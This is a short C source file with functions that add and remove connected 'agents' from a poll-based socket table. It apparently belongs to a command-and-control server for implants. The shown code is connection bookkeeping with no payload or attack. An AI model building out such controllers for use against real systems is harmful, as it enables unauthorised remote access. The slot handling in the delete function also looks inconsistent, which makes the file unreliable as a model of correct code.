#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>
#include <sys/socket.h>

#include "utility.h"
#include "implant.h"
#include "base.h"

int agent_add(Connected_Agents* CA, int sockfd){
	CA->pfds[sockfd].fd = sockfd;
    CA->pfds[sockfd].events = POLLIN;
    CA->num_open_fds++;

	memset(&(CA->agents[sockfd]), 0, sizeof(Agent));
	CA->agents[sockfd].alive = time(NULL);
	CA->agents[sockfd].last_header.index = -1;
    
	return RET_OK;
}

int agent_delete(Connected_Agents* CA, int sockfd){
	close(sockfd);
	CA->pfds[sockfd] = CA->pfds[CA->nfds - 1];
	CA->num_open_fds--;

	CA->agents[sockfd].alive = 0;
	if (CA->agents[sockfd].message){
		free(CA->agents[sockfd].message);
		CA->agents[sockfd].message = NULL;
	}
    
	return RET_OK;
}